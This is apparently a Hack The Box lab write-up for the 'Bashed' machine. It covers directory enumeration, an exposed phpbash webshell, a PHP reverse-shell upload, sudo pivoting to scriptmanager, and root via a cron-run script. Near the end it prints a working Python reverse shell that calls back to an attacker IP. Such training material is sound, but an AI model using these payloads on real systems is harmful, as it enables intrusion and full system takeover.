@@ -1,0 +1,127 @@
+Bashed - Hack The Box - Linux 
+Boot to Root Machine
+
+We only have on port open, that being port 80 http
+
+It is a nice looking webshell, there is a github page that has all the code for the program. We can download and examine it.
+
+We will also run a gobuster to see if there was anything hidden.
+
+Commands and Output:
+===================================================================================================================================
+└──╼ $gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.68
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/04/09 20:51:44 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
+/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
+/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]    
+/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]    
+/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]    
+/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]     
+
+===================================================================================================================================
+
+We go to the php directory:
+http://10.10.10.68/php/
+We find a send mail php file
+
+Next we go to /dev/ and we find the phpbash webshell
+http://10.10.10.68/dev/phpbash.php
+
+The webshell is not persistent. We need to get a reverse shell.
+
+What we can possibly do is upload a php webshell which we can execute and get a full functioing reverse shell. We will upload 
+to upload directory. 
+
+Once we upload the php revershell code unto the machine, we now have a complete functioing shell.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bashed]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.68] 41238
+Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 21:13:09 up 40 min,  0 users,  load average: 1.27, 1.03, 0.56
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+www-data@bashed:/$ sudo -l
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+===================================================================================================================================
+
+
+We can now switch to that user scriptmanager
+Commands and Output:
+===================================================================================================================================
+www-data@bashed:/$ sudo -u scriptmanager bash
+scriptmanager@bashed:/$ 
+===================================================================================================================================
+
+At the top of the root directory we see an odd scripts directory, upon further look we can see that the script manager has python script
+that can be modified and a text file that is owned by root. We can see that the test file is being overwritten every minute, so
+the most logical conclusion is that there is a cronjob that is executing the script and running it as root.
+
+All we need to gain access is modify the python code to get a reverse shell 
+
+Commands and Output:
+===================================================================================================================================
+scriptmanager@bashed:/scripts$ ls -la
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
+drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+-rw-r--r--  1 root          root            12 Apr  9 21:20 test.txt
+scriptmanager@bashed:/scripts$ cat test.txt 
+testing 123!scriptmanager@bashed:/scripts$ cat test.py 
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+scriptmanager@bashed:/scripts$ cat test.py 
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.23",1234));os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bashed]
+└──╼ $nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.68] 43758
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+===================================================================================================================================
+
+DONE
